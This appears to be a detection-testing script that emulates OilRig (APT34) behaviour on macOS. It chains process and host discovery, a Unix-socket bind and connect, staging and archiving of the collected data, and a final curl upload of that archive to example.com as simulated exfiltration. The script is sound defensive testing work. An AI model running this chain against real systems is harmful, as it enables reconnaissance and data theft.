# description: OilRig-like chained process discovery, UIPC C2 simulation, staging, and exfil
# actor: OilRig (APT34) — behavioural emulation only
# mitre: T1057, T1082, T1095, T1074.001, T1560.001, T1041
# reference: https://attack.mitre.org/groups/G0049/
# reference: https://attack.mitre.org/techniques/T1057/
# reference: https://attack.mitre.org/techniques/T1095/
# reference: https://attack.mitre.org/techniques/T1074/001/
# reference: https://attack.mitre.org/techniques/T1560/001/
# reference: https://attack.mitre.org/techniques/T1041/
# reference: https://developer.apple.com/documentation/endpointsecurity/es_event_type_notify_uipc_bind

ROOT="/tmp/oilrig_chain_${ESGRAPH_RUN_ID:?ESGRAPH_RUN_ID is required}"; mkdir -p "${ROOT}/enum" "${ROOT}/stage"

# T1057 / T1082
ROOT="/tmp/oilrig_chain_${ESGRAPH_RUN_ID}"; bash -c 'ps aux | grep -E "[s]sh|[l]aunchd|[l]oginwindow" > "$1/enum/processes.txt" || true' _ "${ROOT}"
ROOT="/tmp/oilrig_chain_${ESGRAPH_RUN_ID}"; bash -c '{ hostname; uname -a; sw_vers 2>/dev/null || true; } > "$1/enum/host.txt"' _ "${ROOT}"
ROOT="/tmp/oilrig_chain_${ESGRAPH_RUN_ID}"; bash -c 'ls -la /private/tmp 2>/dev/null > "$1/enum/private-tmp.txt" || true' _ "${ROOT}"

# UIPC bind + connect — triggers notify_uipc_bind / notify_uipc_connect on macOS ESF
python3 - <<'PY'
import os
import socket
import tempfile
import threading
import time

path = os.path.join(tempfile.gettempdir(), "esgraph-oilrig-uipc.sock")
try:
    os.unlink(path)
except FileNotFoundError:
    pass

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind(path)
server.listen(1)
server.settimeout(5)

accepted = {"ok": False}

def accept_once():
    try:
        conn, _ = server.accept()
        conn.close()
        accepted["ok"] = True
    except OSError:
        pass

thread = threading.Thread(target=accept_once, daemon=True)
thread.start()
time.sleep(0.3)

client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
client.connect(path)
client.close()

thread.join(timeout=2)
server.close()

try:
    os.unlink(path)
except FileNotFoundError:
    pass

print("uipc_bind_connect=ok" if accepted["ok"] else "uipc_bind_connect=partial")
PY

# T1074.001 + T1560.001
ROOT="/tmp/oilrig_chain_${ESGRAPH_RUN_ID}"; bash -c 'cp "$1/enum/processes.txt" "$1/stage/processes.snapshot.txt" 2>/dev/null || true' _ "${ROOT}"
ROOT="/tmp/oilrig_chain_${ESGRAPH_RUN_ID}"; bash -c 'cp "$1/enum/host.txt" "$1/stage/host.snapshot.txt" 2>/dev/null || true' _ "${ROOT}"
ROOT="/tmp/oilrig_chain_${ESGRAPH_RUN_ID}"; bash -c 'tar -czf "$1/stage/oilrig-stage.tgz" -C "$1/stage" . 2>/dev/null || true' _ "${ROOT}"

# T1041 simulated exfiltration.
ROOT="/tmp/oilrig_chain_${ESGRAPH_RUN_ID}"; bash -c '[[ -f "$1/stage/oilrig-stage.tgz" ]] && curl -m 3 -sS -o /dev/null -X POST https://example.com/ --data-binary @"$1/stage/oilrig-stage.tgz" || true' _ "${ROOT}"

ROOT="/tmp/oilrig_chain_${ESGRAPH_RUN_ID}"; bash -c 'ls -la "$1" "$1/enum" "$1/stage" 2>/dev/null || true' _ "${ROOT}"
